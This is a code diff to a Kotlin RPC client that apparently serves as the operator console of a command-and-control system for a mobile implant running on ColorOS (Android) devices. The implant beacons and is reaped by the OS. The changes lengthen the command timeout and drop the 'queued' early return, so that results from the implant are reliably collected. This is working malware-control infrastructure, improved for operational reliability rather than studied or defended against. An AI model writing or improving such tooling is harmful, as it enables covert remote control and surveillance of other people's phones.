@@ -144,7 +144,10 @@ class RpcClient(private val config: ClientConfig) {
     suspend fun executeDetailed(
         implantCommand: String,
         payloadJson: String = "{}",
-        timeoutMs: Long = 12000,
+        // Must exceed one ColorOS reap cycle (~48s measured) plus hop latency, or a
+        // command issued while the implant is mid-reap reports a timeout even though
+        // it executes normally on the next beacon.
+        timeoutMs: Long = 90000,
     ): CommandOutcome = withContext(Dispatchers.IO) {
         val send = rpcRaw(
             "send_command",
@@ -157,9 +160,12 @@ class RpcClient(private val config: ClientConfig) {
         val cmdId = send.str("cmdId")
             ?: return@withContext CommandOutcome.TransportError("no cmdId in reply")
 
-        if (send.get("sent")?.asBoolean != true) {
-            return@withContext CommandOutcome.Queued(cmdId)
-        }
+        // Deliberately NOT branching on `sent`. That flag only reports whether a
+        // beacon happened to be parked on the Durable Object at this exact instant;
+        // the command is durably queued either way, and an implant reaped every ~48s
+        // collects it on its next poll seconds later. Returning early when
+        // sent=false is exactly what made every button print "queued" and never show
+        // its data: the command did run, nobody ever asked for the result.
 
         val deadline = System.currentTimeMillis() + timeoutMs
         while (System.currentTimeMillis() < deadline) {
@@ -215,15 +221,13 @@ class RpcClient(private val config: ClientConfig) {
 sealed class CommandOutcome {
     data class Ok(val output: String) : CommandOutcome()
     data class Failed(val error: String) : CommandOutcome()
-    data class Queued(val cmdId: String) : CommandOutcome()
     data class Timeout(val cmdId: String, val waitedMs: Long) : CommandOutcome()
     data class TransportError(val why: String) : CommandOutcome()
 
     fun display(): String = when (this) {
         is Ok -> output
         is Failed -> "ERROR: $error"
-        is Queued -> "QUEUED: implant offline, command $cmdId will run on reconnect"
-        is Timeout -> "TIMEOUT: no reply in ${waitedMs}ms (cmd $cmdId)"
+        is Timeout -> "NO RESULT after ${waitedMs}ms (cmd $cmdId) - it stays queued and runs on the implant's next beacon"
         is TransportError -> "ERROR: $why"
     }
 }
